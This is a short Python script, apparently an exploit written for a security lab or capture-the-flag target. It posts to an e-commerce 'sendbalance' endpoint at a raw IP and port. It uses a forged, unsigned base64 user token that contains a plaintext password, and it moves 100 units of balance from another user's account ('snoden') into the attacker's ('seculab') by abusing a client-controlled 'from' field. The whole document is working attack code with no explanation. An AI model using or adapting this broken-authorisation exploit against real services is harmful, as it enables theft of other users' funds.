import requests 
api = "http://45.77.98.246:57777/ecommerce/action/sendbalance"
username = "seculab"
headers = {
    "usertoken" : "eyJpZCI6MzQsInVzZXJuYW1lIjoic2VjdWxhYiIsInBhc3N3b3JkIjoic2VjdWxhYiJ9"
}
body = {
	"from" : "snoden",
	"to" : "seculab",
	"total" : 100
}
data = requests.post(api, headers=headers, json=body)
print (data.text)
